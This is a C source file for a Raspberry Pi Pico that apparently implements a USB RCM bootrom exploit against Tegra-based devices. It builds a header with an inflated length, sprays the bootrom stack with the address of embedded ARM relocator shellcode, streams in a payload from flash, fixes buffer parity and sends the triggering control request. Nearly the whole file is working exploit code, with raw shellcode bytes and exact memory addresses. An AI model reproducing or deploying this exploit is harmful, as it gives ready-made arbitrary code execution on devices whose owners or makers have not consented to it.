/*
 * rcm_proto.c
 *
 * Building and sending the RCM message.
 *
 * Two constraints decided the shape of this file:
 *
 * 1. The payload is NEVER loaded into RAM in one piece. The Pico has
 *    264 KB: a chunk is read from the FAT12 through FatFs, appended to the
 *    outgoing packet, and the buffer is reused.
 *
 * 2. The message is a STREAM of bytes, not a sequence of aligned blocks.
 *    The header is 680 bytes (0x2A8), so everything that follows - spray,
 *    intermezzo, payload - straddles the 0x1000 packets. Hence the
 *    buffered writer: written byte-wise, sent as full packets. Any attempt
 *    to align the pieces to 0x1000 shifts the target's whole memory map
 *    and the injection does nothing.
 */
#include <stdio.h>
#include <string.h>
#include <pico/stdlib.h>
#include "ff.h"
#include "config.h"
#include "storage/flash_fat.h"
#include "rcm_host.h"
#include "rcm_proto.h"

#define FILE_READ_CHUNK     512u
#define BULK_TIMEOUT_MS      2000u
#define DEVICE_ID_TIMEOUT_MS 1000u
#define TRIGGER_TIMEOUT_MS   5000u

/*
 * Relocator: runs at 0x4001F000, copies the payload 0x1000 bytes at a time
 * from RCM_PAYLOAD_LOAD_BLOCK to RCM_PAYLOAD_ADDR and jumps into it.
 * The last four words are, in order: 0x4001F020, 0x4001F05C,
 * RCM_PAYLOAD_LOAD_BLOCK, RCM_PAYLOAD_ADDR.
 */
static const uint8_t intermezzo[92] = {
    0x44, 0x00, 0x9F, 0xE5, 0x01, 0x11, 0xA0, 0xE3, 0x40, 0x20, 0x9F, 0xE5,
    0x00, 0x20, 0x42, 0xE0, 0x08, 0x00, 0x00, 0xEB, 0x01, 0x01, 0xA0, 0xE3,
    0x10, 0xFF, 0x2F, 0xE1, 0x00, 0x00, 0xA0, 0xE1, 0x2C, 0x00, 0x9F, 0xE5,
    0x2C, 0x10, 0x9F, 0xE5, 0x02, 0x28, 0xA0, 0xE3, 0x01, 0x00, 0x00, 0xEB,
    0x20, 0x00, 0x9F, 0xE5, 0x10, 0xFF, 0x2F, 0xE1, 0x04, 0x30, 0x90, 0xE4,
    0x04, 0x30, 0x81, 0xE4, 0x04, 0x20, 0x52, 0xE2, 0xFB, 0xFF, 0xFF, 0x1A,
    0x1E, 0xFF, 0x2F, 0xE1, 0x20, 0xF0, 0x01, 0x40, 0x5C, 0xF0, 0x01, 0x40,
    0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0x01, 0x40,
};

// The payload has to land exactly on RCM_PAYLOAD_LOAD_BLOCK. If someone
// touches a define and the arithmetic stops adding up, a build error beats
// an injection that runs and does nothing.
_Static_assert(sizeof(intermezzo) < RCM_CHUNK_SIZE,
               "intermezzo and padding must fit in a single block");
_Static_assert(RCM_HEADER_SIZE % 4u == 0u,
               "the spray after the header must stay 4-byte aligned");
_Static_assert(RCM_PREFIX_SIZE == 0x102A8u,
               "prefix altered: the payload no longer lands on 0x40020000");
_Static_assert(RCM_PAYLOAD_MAX > 0u && RCM_PAYLOAD_MAX == 0x1FFF0u,
               "payload ceiling inconsistent with RCM_MAX_MSG_LEN");
_Static_assert(RCM_PAYLOAD_LOAD_BLOCK + RCM_PAYLOAD_MAX <= RCM_IRAM_END,
               "a payload at the ceiling would run past the end of IRAM");
_Static_assert(RCM_PAYLOAD_ADDR + RCM_PAYLOAD_MAX <= RCM_IRAM_END,
               "the intermezzo's copy would run past the end of IRAM");

static FATFS fs;

// ------------------------------------------------------- buffered writer

// Explicit alignment: this is a DMA buffer for TinyUSB. GCC aligns an array
// of this size anyway, but that is not guaranteed by the standard and this
// is not something to find out in the field. The TinyUSB equivalent is
// CFG_TUH_MEM_ALIGN; it is not used directly so this file stays free of
// tusb.h (which keeps it compilable off-target).
static uint8_t  packet[RCM_CHUNK_SIZE] __attribute__((aligned(4)));
static uint32_t packet_used;
static uint32_t packets_sent;

static void wr_reset(void) {
    packet_used  = 0;
    packets_sent = 0;
}

// Always sends a FULL packet: the target thinks in 0x1000 blocks, not in
// useful bytes. The tail is zeroed.
static bool wr_flush(void) {
    if (packet_used < RCM_CHUNK_SIZE) {
        memset(packet + packet_used, 0, RCM_CHUNK_SIZE - packet_used);
    }
    packet_used = 0;

    if (!rcm_bulk_out(packet, RCM_CHUNK_SIZE, BULK_TIMEOUT_MS)) return false;
    packets_sent++;
    return true;
}

static bool wr(const void *data, uint32_t len) {
    const uint8_t *p = (const uint8_t *)data;

    while (packet_used + len >= RCM_CHUNK_SIZE) {
        uint32_t n = RCM_CHUNK_SIZE - packet_used;
        memcpy(packet + packet_used, p, n);
        packet_used += n;
        if (!wr_flush()) return false;
        p   += n;
        len -= n;
    }

    if (len) {
        memcpy(packet + packet_used, p, len);
        packet_used += len;
    }
    return true;
}

static bool wr_u32(uint32_t v) {
    const uint8_t b[4] = {
        (uint8_t)(v & 0xffu),
        (uint8_t)((v >>  8) & 0xffu),
        (uint8_t)((v >> 16) & 0xffu),
        (uint8_t)((v >> 24) & 0xffu),
    };
    return wr(b, sizeof(b));
}

static bool wr_zero(uint32_t len) {
    while (len) {
        uint32_t n = RCM_CHUNK_SIZE - packet_used;
        if (n > len) n = len;
        memset(packet + packet_used, 0, n);
        packet_used += n;
        len         -= n;
        if (packet_used == RCM_CHUNK_SIZE && !wr_flush()) return false;
    }
    return true;
}

// ------------------------------------------------------- message

// Header: the declared length (the maximum accepted, not the real one)
// followed by zeros up to 680 bytes.
static bool send_header(void) {
    return wr_u32(RCM_MAX_MSG_LEN)
        && wr_zero(RCM_HEADER_SIZE - 4u);
}

// Sprays the intermezzo's address across the whole window that holds the
// bootrom's stack.
static bool send_stack_spray(void) {
    for (uint32_t i = 0; i < RCM_SPRAY_WORDS; i++) {
        if (!wr_u32(RCM_INTERMEZZO_ADDR)) return false;
    }
    return true;
}

// Intermezzo + padding: together they take up exactly one 0x1000 block, so
// the payload lands on RCM_PAYLOAD_LOAD_BLOCK.
static bool send_intermezzo(void) {
    return wr(intermezzo, sizeof(intermezzo))
        && wr_zero(RCM_CHUNK_SIZE - sizeof(intermezzo));
}

static bool send_payload(FIL *fp) {
    static uint8_t buf[FILE_READ_CHUNK];

    for (;;) {
        UINT got = 0;
        if (f_read(fp, buf, sizeof(buf), &got) != FR_OK) return false;
        if (got == 0) break;                 // EOF
        if (!wr(buf, got)) return false;
    }
    return true;
}

// ------------------------------------------------------- sequence

bool rcm_proto_inject(void) {
    // ---- 1. is the target answering? The device ID is the first thing the
    //         bootrom puts on the IN endpoint. If it does not arrive we say
    //         so and try anyway: some targets deliver it late and the
    //         injection still succeeds.
    uint8_t device_id[RCM_DEVICE_ID_LEN];
    if (rcm_bulk_in(device_id, sizeof(device_id), DEVICE_ID_TIMEOUT_MS)) {
        printf("[rcm] device ID:");
        for (unsigned i = 0; i < sizeof(device_id); i++) printf(" %02x", device_id[i]);
        printf("\n");
    } else {
        printf("[rcm] device ID non letto - continuo comunque\n");
    }

    // ---- 2. payload from the FAT12 in flash
    if (f_mount(&fs, "", 1) != FR_OK) {
        printf("[rcm] mount FAT fallito\n");
        return false;
    }

    FIL fp;
    if (f_open(&fp, PAYLOAD_FILENAME, FA_READ) != FR_OK) {
        printf("[rcm] %s non trovato\n", PAYLOAD_FILENAME);
        f_unmount("");
        return false;
    }

    uint32_t payload_size = (uint32_t)f_size(&fp);
    if (payload_size == 0) {
        printf("[rcm] payload vuoto\n");
        f_close(&fp);
        f_unmount("");
        return false;
    }
    // The ceiling is the top of IRAM, not a convention: the payload lands on
    // RCM_PAYLOAD_LOAD_BLOCK and past RCM_IRAM_END there is no memory. A
    // larger payload cannot work under any circumstances, so it is better
    // said here than left to become a timeout on a bulk OUT halfway through.
    if (payload_size > RCM_PAYLOAD_MAX) {
        printf("[rcm] payload troppo grande: %lu byte, il tetto e' %lu "
               "(soffitto IRAM a 0x%08x)\n",
               (unsigned long)payload_size, (unsigned long)RCM_PAYLOAD_MAX,
               RCM_IRAM_END);
        f_close(&fp);
        f_unmount("");
        return false;
    }
    printf("[rcm] payload %lu byte\n", (unsigned long)payload_size);

    // ---- 3. building the message, streamed
    wr_reset();
    if (!send_header())        goto fail;
    if (!send_stack_spray())   goto fail;
    if (!send_intermezzo())    goto fail;
    if (!send_payload(&fp))    goto fail;
    if (!wr_flush())           goto fail;    // partial tail

    f_close(&fp);
    f_unmount("");

    // ---- 4. parity. The bootrom alternates between two copy buffers on
    //         every 0x1000 packet; with an odd number of packets the last
    //         copy lands on the right one. If we are even, one extra
    //         padding packet puts it back.
    if ((packets_sent % 2u) != 1u) {
        if (!wr_flush()) return false;
    }
    printf("[rcm] %lu pacchetti da 0x%x spediti\n",
           (unsigned long)packets_sent, RCM_CHUNK_SIZE);

    // ---- 5. the trigger, awaited.
    //
    //  The outcome is NOT flattened into "success/failure" here, because the
    //  four cases mean different things:
    //
    //    OK       the bootrom closed the status stage before jumping.
    //    TIMEOUT  no more answers. This is the NORMAL outcome of a
    //             successful injection: the target is already running the
    //             payload and has no reason to close the transfer. Treating
    //             it as an error would mean lighting the red LED precisely
    //             when it worked - and the LED is the only feedback there
    //             is in the field.
    //    STALLED  the device REJECTED the request. This is the real
    //             failure: the overflow did not happen.
    //    FAILED   it never even started.
    //
    //  The only definitive verdict is still the target's screen, but telling
    //  a stall from a timeout is the one useful piece of information that
    //  can be had from this side of the cable, and throwing it away would be
    //  a waste.
    rcm_xfer_t trig = rcm_control_out(RCM_TRIGGER_BMREQTYPE, RCM_TRIGGER_BREQUEST,
                                      0, 0, RCM_TRIGGER_WLENGTH, TRIGGER_TIMEOUT_MS);
    printf("[rcm] trigger: %s\n", rcm_xfer_name(trig));

    if (trig == RCM_XFER_STALLED || trig == RCM_XFER_FAILED) {
        printf("[rcm] il target ha respinto il trigger: exploit non innescato\n");
        return false;
    }

    sleep_ms(100);
    return true;

fail:
    printf("[rcm] transfer fallito dopo %lu pacchetti\n",
           (unsigned long)packets_sent);
    f_close(&fp);
    f_unmount("");
    return false;
}
